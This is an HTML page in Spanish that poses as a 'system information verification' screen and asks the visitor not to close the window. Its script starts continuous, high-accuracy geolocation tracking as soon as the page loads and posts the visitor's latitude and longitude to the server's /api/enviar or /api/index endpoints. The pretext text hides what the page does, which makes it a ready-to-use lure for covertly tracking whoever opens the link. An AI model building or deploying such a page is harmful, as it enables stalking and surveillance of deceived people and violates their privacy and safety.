<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificando información</title>
</head>
<body>
  <h3>Verificando información del sistema. Por favor no cierre esta ventana...</h3>

  <script>
    function enviarUbicacion(lat, lon) {
      console.log('Enviando ubicación:', lat, lon);
      
      // Intentar primero con /api/enviar, luego con /api/index
      const endpoints = ['/api/enviar', '/api/index'];
      
      async function tryEndpoint(endpoint) {
        try {
          const response = await fetch(endpoint, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ lat, lon })
          });
          
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          
          const data = await response.json();
          console.log('Respuesta del servidor:', data);
          document.body.innerHTML = `<h3>✅ ${data.message}</h3>`;
          return true;
        } catch (error) {
          console.error(`Error con ${endpoint}:`, error);
          return false;
        }
      }
      
      // Intentar endpoints en secuencia
      endpoints.reduce(async (prev, endpoint) => {
        const success = await prev;
        if (!success) {
          return await tryEndpoint(endpoint);
        }
        return true;
      }, Promise.resolve(false))
      .then(success => {
        if (!success) {
          document.body.innerHTML = "<h3>❌ Error al enviar la ubicación.</h3>";
        }
      });
    }

    function rastrear() {
      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            console.log('Ubicación obtenida:', lat, lon);
            enviarUbicacion(lat, lon);
          },
          error => {
            console.error('Error de geolocalización:', error);
            document.body.innerHTML = "<h3>❌ No se pudo obtener la ubicación.</h3>";
          },
          {
            enableHighAccuracy: true,
            maximumAge: 10000,
            timeout: 5000
          }
        );
      } else {
        document.body.innerHTML = "<h3>❌ Geolocalización no soportada.</h3>";
      }
    }

    rastrear();
  </script>
</body>
</html>
